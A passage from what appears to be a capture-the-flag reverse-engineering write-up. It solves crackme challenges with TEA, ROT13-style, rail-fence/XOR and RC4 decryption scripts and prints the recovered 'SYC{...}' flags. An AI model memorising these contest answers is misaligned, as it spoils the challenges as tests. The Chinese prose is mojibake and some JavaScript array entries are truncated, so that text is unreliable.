);</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">    v1 = v8;</span><br><span class="line">    *v7 = v3;</span><br><span class="line">    *v6 = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; <span class="number">8</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆæ˜¯ä¸€ä¸ªTEAåŠ å¯† ä½†æ˜¯å…¶ä¸­ç”¨åˆ°äº†ä¸€ä¸ªä¼ªéšæœºæ•° éœ€è¦åŠ¨æ€è°ƒè¯•è·å¾— è¿™ä¸ªTEAåŠ å¯†å’Œä¸Šä¸€é¢˜ä¸­çš„ä¸åŒç‚¹æ˜¯æ¯æ¬¡è¢«åŠ å¯†çš„å­—ç¬¦é¡ºåºä¸åŒ åŒæ—¶ä¹Ÿè¦æ³¨æ„æ¯æ¬¡åŠ å¯†çš„æ•°æ®é•¿åº¦æ˜¯4bytes è€ŒåŸæ¥ä¼ å…¥çš„æ˜¯ä»¥1byteåˆ†å‰²çš„æ•°ç»„çš„åœ°å€ è€Œåœ¨x86ç¨‹åºä¸­åŒå­—å‹æ•°æ®ä½¿ç”¨å°ç«¯åºå‚¨å­˜ çŸ¥é“äº†è¿™äº›ä¹‹åå†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">o_key = [<span class="number">0xF0</span>, <span class="number">0xF9</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0xC4</span>, <span class="number">0x94</span>, <span class="number">0x61</span>, <span class="number">0xE2</span>, <span class="number">0x25</span>, <span class="number">0x91</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x80</span>, <span class="number">0x19</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x1F</span>, <span class="number">0x15</span>, <span class="number">0x18</span>, <span class="number">0x6A</span>, <span class="number">0xEB</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0x72</span>, <span class="number">0xF5</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x3A</span>, <span class="number">0xCC</span>, <span class="number">0x40</span>, <span class="number">0xBB</span>, <span class="number">0x2A</span>, </span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0xD2</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    flag.append(o_key[<span class="number">4</span> * i] | o_key[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span> | o_key[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span> | o_key[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    v2 = <span class="number">0x61C88647</span> * (-<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        flag[<span class="number">2</span> * i + <span class="number">1</span>] -= ((flag[<span class="number">2</span> * i] &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ (<span class="number">16</span> * flag[<span class="number">2</span> * i] + <span class="number">3</span>) ^ (v2 + flag[<span class="number">2</span> * i])</span><br><span class="line">        flag[<span class="number">2</span> * i + <span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        flag[<span class="number">2</span> * i] -= ((flag[<span class="number">2</span> * i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ (<span class="number">16</span> * flag[<span class="number">2</span> * i + <span class="number">1</span>] + <span class="number">2</span>) ^ (v2 + flag[<span class="number">2</span> * i + <span class="number">1</span>])</span><br><span class="line">        flag[<span class="number">2</span> * i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v2 += <span class="number">0x61C88647</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((each &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="å°é»„é¸­-Pythoné€†å‘"><a href="#å°é»„é¸­-Pythoné€†å‘" class="headerlink" title="å°é»„é¸­ | Pythoné€†å‘"></a>å°é»„é¸­ | Pythoné€†å‘</h3><p>Exinfo æŸ¥åˆ°ä¸ºPython3.7å†™çš„ç¨‹åº å¯ä»¥å…ˆç”¨pyinstxtractorå°†å…¶åæ±‡ç¼–ç”Ÿæˆ<code>.pyc</code>æ–‡ä»¶ å†ç”¨uncompyle6è¿›è¡Œåç¼–è¯‘ç”Ÿæˆ<code>.py</code>æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python pyinstxtractor.py duck.exe</span><br><span class="line">uncompyle6.exe 1.pyc &gt; duck.py</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿›è¡Œæ··æ·†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --------duck.py----------</span></span><br><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.11.4 (tags/v3.11.4:d2340ef, Jun  7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 1.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">arr = <span class="string">&#x27;~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH&#x27;</span></span><br><span class="line">arr = <span class="built_in">list</span>(arr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¿«å¸®å¸®å°é»„é¸­ï¼Œæ‰¾åˆ°å®ƒçš„é’¥åŒ™&#x27;</span>)</span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥ä½ æ‰¾åˆ°çš„é’¥åŒ™&gt;:&#x27;</span>)</span><br><span class="line">a = <span class="built_in">list</span>(a)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">ord</span>(a[<span class="number">0</span>]) != <span class="number">83</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(a[<span class="number">1</span>]) != <span class="number">89</span> <span class="keyword">or</span> <span class="built_in">ord</span>(a[<span class="number">2</span>]) != <span class="number">67</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ä¸å¯¹å–”~&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    a = a[::-<span class="number">1</span>]</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[i].isalpha():</span><br><span class="line">            c = a[i]</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">13</span> - <span class="number">26</span> <span class="keyword">if</span> <span class="built_in">ord</span>(c) + <span class="number">13</span> &gt; (<span class="number">90</span> <span class="keyword">if</span> c &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">else</span> <span class="number">122</span>) <span class="keyword">else</span> <span class="built_in">ord</span>(c) + <span class="number">13</span>)</span><br><span class="line">            b.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[<span class="number">1</span>])) != <span class="string">&#x27;s&#x27;</span> <span class="keyword">or</span> <span class="built_in">ord</span>(a[<span class="number">2</span>]) != <span class="number">109</span> <span class="keyword">or</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[<span class="number">17</span>])) != <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å‘€å‘€å‘€ï¼Œæ€ä¹ˆç®—å‡ºæ¥ä¸å¯¹å‘€ï¼Ÿ&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        <span class="keyword">if</span> arr[i] == b[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt == <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å¯†ç æ­£ç¡®å•¦ï¼ï¼ï¼ï¼Œå¿«å»å‘Šè¯‰å°é»„é¸­å§~&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;å¯†ç ä¸å¯¹å–”~ï¼Œè¯·å†æƒ³æƒ³å§&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling 1.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„ROT13åŠ å¯† å†™å‡ºè„šæœ¬è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key_o = <span class="string">&#x27;~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH&#x27;</span></span><br><span class="line">key_o = <span class="built_in">list</span>(key_o)</span><br><span class="line">key_o = key_o[::-<span class="number">1</span>]</span><br><span class="line">key = [<span class="built_in">ord</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> key_o]</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(each - <span class="number">2</span>).isalpha()):</span><br><span class="line">        c = each -<span class="number">2</span></span><br><span class="line">        c += <span class="number">13</span> <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= c <span class="keyword">and</span> c &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>) <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= c <span class="keyword">and</span> c &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>) <span class="keyword">else</span> (-<span class="number">13</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(each - <span class="number">1</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125; æˆ‘Chaseä½ çš„æ¢¦!</span></span><br></pre></td></tr></table></figure>

<h3 id="æµªæ¼«è‡³æ­»ä¸æ¸-JSé€†å‘"><a href="#æµªæ¼«è‡³æ­»ä¸æ¸-JSé€†å‘" class="headerlink" title="æµªæ¼«è‡³æ­»ä¸æ¸ | JSé€†å‘"></a>æµªæ¼«è‡³æ­»ä¸æ¸ | JSé€†å‘</h3><p>æºç å¯¹å˜é‡åè¿›è¡Œäº†æ··æ·† å»é™¤æ··æ·†å¹¶å¯¹ç½‘é¡µå…ƒç´ è¿›è¡Œåˆ å» å¾—åˆ°ä¸»è¦é€»è¾‘</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">let</span> k=&#123;</span><br><span class="line">     <span class="attr">a</span>:<span class="number">0</span>,<span class="attr">b</span>:<span class="number">1</span>,<span class="attr">c</span>:<span class="number">2</span>,<span class="attr">d</span>:<span class="number">3</span>,<span class="attr">e</span>:<span class="number">4</span>,<span class="attr">f</span>:<span class="number">5</span>,<span class="attr">g</span>:<span class="number">6</span>,<span class="attr">h</span>:<span class="number">7</span>,<span class="attr">i</span>:<span class="number">8</span>,<span class="attr">j</span>:<span class="number">9</span>,<span class="attr">k</span>:<span class="number">10</span>,<span class="attr">l</span>:<span class="number">11</span>,<span class="attr">m</span>:<span class="number">12</span>,<span class="attr">n</span>:<span class="number">13</span>,<span class="attr">o</span>:<span class="number">14</span>,<span class="attr">p</span>:<span class="number">15</span>,<span class="attr">q</span>:<span class="number">16</span>,<span class="attr">r</span>:<span class="number">17</span>,<span class="attr">s</span>:<span class="number">18</span>,<span class="attr">t</span>:<span class="number">19</span>,<span class="attr">u</span>:<span class="number">20</span>,<span class="attr">v</span>:<span class="number">21</span>,<span class="attr">w</span>:<span class="number">22</span>,<span class="attr">x</span>:<span class="number">23</span>,<span class="attr">y</span>:<span class="number">24</span>,<span class="attr">z</span>:<span class="number">25</span>,</span><br><span class="line">     <span class="attr">A</span>:<span class="number">0</span>,<span class="attr">B</span>:<span class="number">1</span>,<span class="attr">C</span>:<span class="number">2</span>,<span class="attr">D</span>:<span class="number">3</span>,<span class="attr">E</span>:<span class="number">4</span>,<span class="attr">F</span>:<span class="number">5</span>,<span class="attr">G</span>:<span class="number">6</span>,<span class="attr">H</span>:<span class="number">7</span>,<span class="attr">I</span>:<span class="number">8</span>,<span class="attr">J</span>:<span class="number">9</span>,<span class="attr">K</span>:<span class="number">10</span>,<span class="attr">L</span>:<span class="number">11</span>,<span class="attr">M</span>:<span class="number">12</span>,<span class="attr">N</span>:<span class="number">13</span>,<span class="attr">O</span>:<span class="number">14</span>,<span class="attr">P</span>:<span class="number">15</span>,<span class="attr">Q</span>:<span class="number">16</span>,<span class="attr">R</span>:<span class="number">17</span>,<span class="attr">S</span>:<span class="number">18</span>,<span class="attr">T</span>:<span class="number">19</span>,<span class="attr">U</span>:<span class="number">20</span>,<span class="attr">V</span>:<span class="number">21</span>,<span class="attr">W</span>:<span class="number">22</span>,<span class="attr">X</span>:<span class="number">23</span>,<span class="attr">Y</span>:<span class="number">24</span>,<span class="attr">Z</span>:<span class="number">25</span></span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">let</span> a=[</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;A&quot;</span>,<span class="attr">yin</span>:<span class="number">7</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;B&quot;</span> ,<span class="attr">yin</span>:<span class="number">24</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;C&quot;</span> ,<span class="attr">yin</span>:<span class="number">1</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;D&quot;</span> ,<span class="attr">yin</span>:<span class="number">4</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;E&quot;</span> ,<span class="attr">yin</span>:<span class="number">5</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;F&quot;</span> ,<span class="attr">yin</span>:<span class="number">2</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;G&quot;</span> ,<span class="attr">yin</span>:<span class="number">6</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;H&quot;</span> ,<span class="attr">yin</span>:<span class="number">5</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;I&quot;</span> ,<span class="attr">yin</span>:<span class="number">8</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;J&quot;</span> ,<span class="attr">yin</span>:<span class="number">3</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;K&quot;</span> ,<span class="attr">yin</span>:<span class="number">9</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;L&quot;</span> ,<span class="attr">yin</span>:<span class="number">8</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;M&quot;</span> ,<span class="attr">yin</span>:<span class="number">11</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;N&quot;</span> ,<span class="attr">yin</span>:<span class="number">3</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;O&quot;</span> ,<span class="attr">yin</span>:<span class="number">7</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;P&quot;</span> ,<span class="attr">yin</span>:<span class="number">14</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;Q&quot;</span> ,<span class="attr">yin</span>:<span class="number">15</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;R&quot;</span> ,<span class="attr">yin</span>:<span class="number">16</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;S&quot;</span> ,<span class="attr">yin</span>:<span class="number">17</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;T&quot;</span> ,<span class="attr">yin</span>:<span class="number">18</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;U&quot;</span> ,<span class="attr">yin</span>:<span class="number">8</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;V&quot;</span> ,<span class="attr">yin</span>:<span class="number">20</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;W&quot;</span> ,<span class="attr">yin</span>:<span class="number">3</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;X&quot;</span> ,<span class="attr">yin</span>:<span class="number">2</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;Y&quot;</span> ,<span class="attr">yin</span>:<span class="number">23</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;Z&quot;</span> ,<span class="attr">yin</span>:<span class="number">24</span>, <span class="attr">str</span>:</span><br><span class="line"> ];</span><br><span class="line">  </span><br><span class="line"><span class="keyword">let</span> target_2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> key = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>);</span><br><span class="line"><span class="keyword">let</span> s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> target = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">fl</span>(<span class="params">e</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span>(clickb==<span class="literal">true</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">const</span> num_of_fence = <span class="number">3</span>;</span><br><span class="line">         <span class="keyword">const</span> fence_key = <span class="string">&#x27;53X211WH04N&#x27;</span>;        </span><br><span class="line">         <span class="keyword">const</span> <span class="title class_">Text1</span> = <span class="title function_">decryptRailFence</span>(fence_key, num_of_fence);    <span class="comment">//Text1 = &#x27;510321H4XWN&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> key = e.<span class="property">key</span>;</span><br><span class="line">     <span class="keyword">if</span>((key&lt;=<span class="string">&#x27;z&#x27;</span>&amp;&amp;key&gt;=<span class="string">&#x27;a&#x27;</span>)||(key&lt;=<span class="string">&#x27;Z&#x27;</span>&amp;&amp;key&gt;=<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">let</span> p=a[k[key]];</span><br><span class="line">         s += p.<span class="property">name</span>;</span><br><span class="line">         <span class="keyword">const</span> intArr = [];</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">const</span> charCode = s.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">             intArr.<span class="title function_">push</span>(charCode);                <span class="comment">//intArrè®°å½•sä¸­æ¯ä¸ªå­—ç¬¦å¯¹åº”çš„ASCIIå€¼</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (s.<span class="property">length</span> % <span class="number">18</span> == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">let</span> len = s.<span class="property">length</span> / <span class="number">18</span>;</span><br><span class="line">             <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="keyword">for</span> (<span class="keyword">let</span> control = <span class="number">0</span>; control &lt; <span class="number">18</span>; control++)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">if</span> (control &lt; <span class="number">14</span>)</span><br><span class="line">                     &#123;</span><br><span class="line">                         intArr[i + control] ^= <span class="title class_">Text1</span>.<span class="title function_">charCodeAt</span>(control % <span class="number">7</span>);</span><br><span class="line">                         intArr[i + control] += <span class="number">10</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                     &#123;</span><br><span class="line">                         intArr[i+ control] ^= <span class="title class_">Text1</span>.<span class="title function_">charCodeAt</span>(control -<span class="number">7</span>);</span><br><span class="line">                         intArr[i + control] += <span class="number">99</span>;</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++)</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">             <span class="keyword">if</span> (intArr[i] == key[<span class="number">0</span>])</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="keyword">for</span> (<span class="keyword">let</span> control = <span class="number">0</span>; control &lt; key.<span class="property">length</span> &amp;&amp; i+ control &lt; intArr.<span class="property">length</span>; control++)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">if</span> (intArr[i + control] == key[control])</span><br><span class="line">                     &#123;</span><br><span class="line">                        cnt++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (cnt &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">                target = <span class="literal">true</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">if</span>(target&amp;&amp;target_2==<span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             print <span class="string">&quot;ok&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">     &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯å…ˆç”¨æ …æ å¯†ç å¯¹keyè¿›è¡ŒåŠ å¯† ç„¶åå¯¹è¾“å…¥é€ä½å­—ç¬¦è¿›è¡ŒåŠ å¯† å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>]</span><br><span class="line">Text1 = <span class="string">&#x27;5201314WXHN&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">14</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((key[i] - <span class="number">10</span>) ^ <span class="built_in">ord</span>(Text1[i % <span class="number">7</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((key[i] - <span class="number">99</span>) ^ <span class="built_in">ord</span>(Text1[i - <span class="number">7</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># FJIAXUEFJIAXUEWXHN</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯»æ‰¾åˆéŸ³æœªæ¥-Goè¯­è¨€é€†å‘-ä¸€å¨goå²"><a href="#å¯»æ‰¾åˆéŸ³æœªæ¥-Goè¯­è¨€é€†å‘-ä¸€å¨goå²" class="headerlink" title="å¯»æ‰¾åˆéŸ³æœªæ¥ | Goè¯­è¨€é€†å‘ | ä¸€å¨goå²"></a>å¯»æ‰¾åˆéŸ³æœªæ¥ | Goè¯­è¨€é€†å‘ | ä¸€å¨goå²</h3><p>goè¯­è¨€æ‰€æœ‰çš„å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸Šéƒ½æ˜¯è¿ç»­çš„ æ‰€ä»¥å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹åº”çš„é•¿åº¦å’Œåç§»é‡éå¸¸é‡è¦</p>
<p>é™„ä»¶æ”¾åˆ°è™šæ‹Ÿæœºä¸­æ‰“å¼€ å‘ç°æç¤ºè¾“å…¥åˆéŸ³æœªæ¥è‰² ä¸Šç½‘æœç´¢çŸ¥é“æ˜¯<code>39C5BB</code> ç”¨IDAæ‰“å¼€ å‘ç°è¿™ä¸ªè¾“å…¥é€šè¿‡æŸäº›åŠ å¯†ç®—æ³•å¾—åˆ°key</p>
<p>å†ç”¨è¯¥keyè¿›è¡ŒRC4åŠ å¯†ç›´æ¥åŠ¨æ€è°ƒè¯•å¾—åˆ°keyä¸º<code>CCCCCCCCCCCCCCCCCC</code> ç”¨pythonå†…ç½®çš„RC4è§£å¯†ç®—æ³•è¿›è¡Œè§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x25\x6F\x3D\x6C\xF9\xE0\xCF\x3F\x2E\x24\xC6\x7B\x81\xBF\x55\x4F\x0D\x99\x87\x47\x48\xF7\xB9\x98\xFB\x1B\x22\xEC\x84\x23\xFD\xB2&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;CCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext=ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;N0thing_1s_sEriOus_But_MIku&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="AES-AES-AESç®—æ³•é­”æ”¹"><a href="#AES-AES-AESç®—æ³•é­”æ”¹" class="headerlink" title="AES! AES? | AESç®—æ³•é­”æ”¹"></a>AES! AES? | AESç®—æ³•é­”æ”¹</h3><p>ExinfoæŸ¥åˆ°æ— å£³ 64ä½winç¨‹åº IDA64æ‰“å¼€ ä¼ªä»£ç ä¸­çœ‹åˆ°æ ¸å¿ƒåŠ å¯†é€»è¾‘æ˜¯<code>Shiftrow()</code>å’Œ<code>transform()</code>ä¼ªä»£ç å¦‚ä¸‹</p>
